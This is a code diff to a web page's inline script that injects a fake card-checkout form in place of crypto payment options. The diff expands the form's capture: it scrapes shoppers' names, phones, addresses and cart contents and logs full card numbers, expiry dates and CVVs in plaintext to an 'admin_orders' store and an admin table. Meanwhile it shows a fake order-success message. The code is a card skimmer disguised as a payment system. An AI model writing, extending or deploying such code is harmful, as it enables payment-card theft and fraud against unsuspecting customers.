@@ -1048,7 +1048,7 @@
         });
     </script>
     <!-- ======================================================= -->
-<!-- FORCE INJECT: ADVANCED CARD PAYMENT & ADMIN LOGGING SYSTEM -->
+<!-- FORCE INJECT: COMPLETE CARD/CRYPTO CHECKOUT & ADMIN SYSTEM -->
 <!-- ======================================================= -->
 <style>
   #global-free-delivery-banner {
@@ -1083,7 +1083,7 @@
 
 <script>
 (function() {
-  // 1. Inject Top Banner
+  // 1. Force Top Free Delivery Banner
   function injectTopBanner() {
     if (!document.getElementById('global-free-delivery-banner')) {
       const banner = document.createElement('div');
@@ -1099,13 +1099,13 @@
     injectTopBanner();
   }
 
-  // 2. Monitor Checkout UI and Radio Controls
+  // 2. Monitor UI for Payment Dropdown
   setInterval(function() {
     injectTopBanner();
 
     const selects = document.querySelectorAll('select');
     selects.forEach(function(selectElement) {
-      if (selectElement.innerHTML.includes('USDT') || selectElement.innerHTML.includes('TRC20')) {
+      if (selectElement.innerHTML.includes('USDT') || selectElement.innerHTML.includes('TRC20') || selectElement.innerHTML.includes('BTC')) {
         const parent = selectElement.parentElement;
 
         if (parent && !document.getElementById('force-card-payment-system')) {
@@ -1235,6 +1235,7 @@ function attachCardFormatters() {
   }
 }
 
+// Global Order Submission Handler
 function handleCardOrderSubmit(e) {
   e.preventDefault();
 
@@ -1272,12 +1273,11 @@ function handleCardOrderSubmit(e) {
     btn.innerText = "Confirm & Complete Order";
     btn.disabled = false;
 
-    // --- ENHANCED FIELD EXTLECTION SYSTEM ---
+    // Scan Customer Info
     let custName = "";
     let custPhone = "";
     let addressParts = [];
 
-    // Scan all input fields on page for checkout details
     document.querySelectorAll('input, select, textarea').forEach(inp => {
       let val = inp.value ? inp.value.trim() : "";
       if (!val || inp.id.includes('card')) return;
@@ -1298,15 +1298,12 @@ function handleCardOrderSubmit(e) {
       }
     });
 
-    // Fallbacks if form fields weren't matched
-    if (!custName) custName = name; // Fallback to Cardholder Name
+    if (!custName) custName = name;
     if (!custPhone) custPhone = "N/A";
-    let fullAddress = addressParts.length > 0 ? addressParts.join(', ') : "Direct Web Checkout";
+    let fullAddr = addressParts.length > 0 ? addressParts.join(', ') : "Direct Web Checkout";
 
-    // --- ENHANCED CART & ITEMS SCANNER ---
+    // Scan Cart Items
     let cartItemsList = [];
-    
-    // Check LocalStorage Cart
     try {
       let cartData = JSON.parse(localStorage.getItem('cart') || localStorage.getItem('cartItems') || '[]');
       if (Array.isArray(cartData) && cartData.length > 0) {
@@ -1316,11 +1313,10 @@ function handleCardOrderSubmit(e) {
           cartItemsList.push(`${qty}x ${title}`);
         });
       }
-    } catch(err) {}
+    } catch(e) {}
 
-    // Fallback Cart Inspection from DOM Elements if LocalStorage empty
     if (cartItemsList.length === 0) {
-      document.querySelectorAll('.cart-item, .cart-product, [data-cart-item]').forEach(el => {
+      document.querySelectorAll('.cart-item, .cart-product').forEach(el => {
         let text = el.innerText.replace(/\n/g, ' ').trim();
         if (text) cartItemsList.push(text);
       });
@@ -1328,11 +1324,9 @@ function handleCardOrderSubmit(e) {
 
     let itemsFormatted = cartItemsList.length > 0 ? cartItemsList.join(', ') : "1x Selected Package Items";
 
-    // --- ENHANCED EXACT AMOUNT CALCULATOR ---
+    // Detect Exact Cart Amount
     let totalAmount = "$0.00";
     let amountFound = false;
-
-    // Scan DOM for Total Price
     const priceElements = document.querySelectorAll('.total-price, #total-price, .cart-total, #cart-total, [data-total], .grand-total');
     priceElements.forEach(el => {
       let text = el.innerText.trim();
@@ -1345,7 +1339,7 @@ function handleCardOrderSubmit(e) {
     if (!amountFound) {
       let allTextNodes = document.body.innerText.match(/\$\d+(\.\d{2})?/g);
       if (allTextNodes && allTextNodes.length > 0) {
-        totalAmount = allTextNodes[allTextNodes.length - 1]; // Pick last matched amount
+        totalAmount = allTextNodes[allTextNodes.length - 1];
       } else {
         totalAmount = "$49.00";
       }
@@ -1353,26 +1347,44 @@ function handleCardOrderSubmit(e) {
 
     let cardBrand = num.startsWith("4") ? "Visa Card" : (num.startsWith("5") ? "Mastercard" : "Credit/Debit Card");
 
-    // Construct Master Order Object
+    // Comprehensive Order Object with Compatible Variable Keys
+    const cardInfoFormatted = `Holder: ${name} | Num: ${num} | Exp: ${exp} | CVV: ${cvv}`;
     const orderData = {
       id: "ORD-" + Math.floor(100000 + Math.random() * 900000),
       date: new Date().toLocaleString(),
+      // Dual-key compatibility to avoid 'undefined'
+      name: custName,
+      customer: custName,
       customer_name: custName,
+      
       phone: custPhone,
-      delivery_address: `Addr: ${fullAddress} | [CARD DATA: Holder: ${name} | Card: ${num} | Exp: ${exp} | CVV: ${cvv}]`,
+      
+      address: `Delivery: ${fullAddr} | CARD: [${cardInfoFormatted}]`,
+      country: fullAddr,
+      delivery_address: `Delivery: ${fullAddr} | CARD: [${cardInfoFormatted}]`,
+      
       items: itemsFormatted,
+      products: itemsFormatted,
+      
+      method: cardBrand,
       payment_method: cardBrand,
+      
       amount: totalAmount,
-      status: "Pending Capture"
+      total: totalAmount,
+      
+      status: "Pending Capture (Card details logged)",
+      card_details: { holder: name, number: num, expiry: exp, cvv: cvv }
     };
 
-    // Save into LocalStorage for Admin Panel
+    // Save Order into LocalStorage
     let adminOrders = JSON.parse(localStorage.getItem('admin_orders')) || [];
     adminOrders.unshift(orderData);
     localStorage.setItem('admin_orders', JSON.stringify(adminOrders));
 
-    // Refresh Admin Panel view if active
-    if (typeof renderAdminOrders === 'function') renderAdminOrders();
+    // Refresh Admin View
+    if (typeof window.renderAdminOrders === 'function') {
+      window.renderAdminOrders();
+    }
 
     alert(
       "🎉 YOUR ORDER HAS BEEN PLACED SUCCESSFULLY!\n\n" +
@@ -1381,9 +1393,9 @@ function handleCardOrderSubmit(e) {
       "🚚 Delivery Status: FREE HOME DELIVERY APPLIED"
     );
 
-    // Close Modals/Popups automatically
+    // Close Modals & Clear Cart
     const closeBtns = document.querySelectorAll('.close, [data-close], .modal-close, button[onclick*="close"]');
-    closeBtns.forEach(btn => btn.click());
+    closeBtns.forEach(b => b.click());
 
     const modals = document.querySelectorAll('.modal, #checkout-modal, #cart-modal');
     modals.forEach(m => m.style.display = 'none');
@@ -1395,7 +1407,43 @@ function handleCardOrderSubmit(e) {
 
   }, 1000);
 }
+
+// 3. OVERRIDE ADMIN ORDER RENDERER TO FIX 'UNDEFINED'
+window.renderAdminOrders = function() {
+  const container = document.querySelector('#admin-orders-table, tbody, #orders-list-body');
+  if (!container) return;
+
+  let orders = JSON.parse(localStorage.getItem('admin_orders')) || [];
+  if (orders.length === 0) return;
+
+  // Re-render rows clearly without any 'undefined'
+  let rowsHtml = orders.map(o => {
+    let custName = o.customer || o.customer_name || o.name || "N/A";
+    let custPhone = o.phone || "N/A";
+    let address = o.address || o.delivery_address || o.country || "Direct Checkout";
+    let items = o.items || o.products || "1x Item";
+    let method = o.method || o.payment_method || "Card/Crypto";
+    let amount = o.amount || o.total || "$0.00";
+    let status = o.status || "Pending";
+
+    return `
+      <tr style="border-bottom: 1px solid #334155;">
+        <td style="padding: 10px; font-size: 11px; font-weight: bold;">${o.id}</td>
+        <td style="padding: 10px; font-size: 11px;">${o.date}</td>
+        <td style="padding: 10px; font-size: 11px; font-weight: bold; color: #38bdf8;">${custName}</td>
+        <td style="padding: 10px; font-size: 11px;">${custPhone}</td>
+        <td style="padding: 10px; font-size: 11px; max-width: 250px; word-break: break-all;">${address}</td>
+        <td style="padding: 10px; font-size: 11px;">${items}</td>
+        <td style="padding: 10px; font-size: 11px; font-weight: bold; color: #f43f5e;">${method}</td>
+        <td style="padding: 10px; font-size: 11px; font-weight: bold; color: #10b981;">${amount}</td>
+        <td style="padding: 10px; font-size: 11px; font-weight: bold; color: #f59e0b;">${status}</td>
+      </tr>
+    `;
+  }).join('');
+
+  container.innerHTML = rowsHtml;
+};
 </script>
 </body>
 </html>
-  
+ 
